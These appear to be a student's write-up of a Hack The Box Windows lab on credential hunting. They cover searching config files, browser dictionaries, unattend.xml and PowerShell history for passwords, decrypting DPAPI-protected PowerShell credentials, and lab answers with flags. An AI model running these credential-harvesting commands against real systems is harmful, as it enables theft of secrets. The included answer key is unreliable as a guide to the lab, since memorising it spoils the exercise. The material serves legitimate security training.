# Credential Hunting
## Application Configuration Files
### Searching for Files

```powershell
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

## Dictionary Files
### Chrome Dictionary Files
Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.

```powershell
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

Password1234!
```

## Unattended Installation Files
Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

```cmd
C:\>dir /s /b unattend.xml
```

### Unattend.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

## PowerShell History File
Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:

- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

```powershell
PS C:\htb> (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user.

```powershell
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:te
```

## Powershell Credential
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

### Decrypting PowerShell Credentials
If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from pass.xml. The example below assumes the former.

```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

## Questions
RDP to 10.129.95.21 (ACADEMY-WINLPE-WS01), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Search the file system for a file containing a password. Submit the password as your answer. **Answer: Pr0xyadm1nPassw0rd!**
   - Start looking from `C:\Users` folder:
        ```powershell
        PS C:\Users> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
        Public\Documents\settings.xml
        PS C:\Users> cat Public\Documents\settings.xml | findstr passwo
            <password>Pr0xyadm1nPassw0rd!</password>
            | NOTE: You should either specify username/password OR
            <password>repopwd</password>
        ```

RDP to 10.129.95.21 (ACADEMY-WINLPE-WS01), with user `bob` and password `Str0ng3ncryptedP@ss!`
2. Connect as the bob user and practice decrypting the credentials in the pass.xml file. Submit the contents of the flag.txt on the desktop once you are done. **Answer: 3ncryt10n_w0nt_4llw@ys_s@v3_y0u**
   - Find `pass.xml` location:
        ```powershell
        PS C:\> Get-ChildItem -Filter "*filename*" -Recurse -File

            Directory: C:\Scripts


        Mode                 LastWriteTime         Length Name
        ----                 -------------         ------ ----
        -a----         5/24/2021   6:08 PM           1828 pass.xml
        ```
   - Decrypt Powershell credential:
        ```powershell
        PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
        PS C:\> $credential.GetNetworkCredential().password
        Str0ng3ncryptedP@ss!
        ```